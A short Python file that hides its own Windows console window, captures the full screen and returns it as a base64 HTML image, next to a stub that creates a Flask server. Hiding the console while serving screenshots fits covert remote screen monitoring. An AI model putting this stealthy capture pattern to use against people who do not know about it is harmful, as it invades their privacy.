import base64
import ctypes
import json
from io import BytesIO

from flask import Flask, Request,request

from PIL import Image, ImageGrab

whnd = ctypes.windll.kernel32.GetConsoleWindow()
ctypes.windll.user32.ShowWindow(whnd, 0)
ctypes.windll.kernel32.CloseHandle(whnd)


def get_full_screenshot() -> str:
    """Get an image that can be viewed in a browser.

    Args:
        None.
    
    Return:
        str.

    Note:
        If system is sleeping, you cannot get screenshots.
    """
    try:
        im_raw = ImageGrab.grab()
        out_data = BytesIO()
        im_raw.save(out_data, format='PNG')
        data_bytes = out_data.getvalue()
        b64_data_byte = base64.b64encode(data_bytes)
        b64_data_string = b64_data_byte.decode()
        b64_data_string_header = "data:image/jpeg;base64,"+b64_data_string
        return "<img src=%s>" % b64_data_string_header
    except:
        return "Can`t get a screenshot, maybe system is sleeping."


def server():
    return Flask(__name__)
